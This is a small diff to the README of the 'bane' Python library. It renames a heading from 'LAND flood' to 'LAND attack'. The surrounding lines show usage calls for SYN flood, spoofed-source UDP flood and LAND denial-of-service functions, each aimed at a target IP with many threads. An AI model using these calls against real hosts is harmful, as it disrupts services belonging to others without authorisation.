@@ -149,5 +149,5 @@ II-Usage:
 <br>bane.synflood(IP , p=port , duration= 300 , syn=1 , rst=0 , psh=0 , ack=0 , urg=0 , fin=0 , interval=0.1 , threads=50 , timeout=5 )
 <h4>Spoofed source UDP flood:</h4>
 <br>bane.spoofed_udp_flood(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
-<h4>LAND flood:</h4>
+<h4>LAND attack:</h4>
 <br>bane.land(IP , p=port , duration= 300 , min_size=10 , max_size=20 , interval=0.1 , threads=50 , timeout=5 )
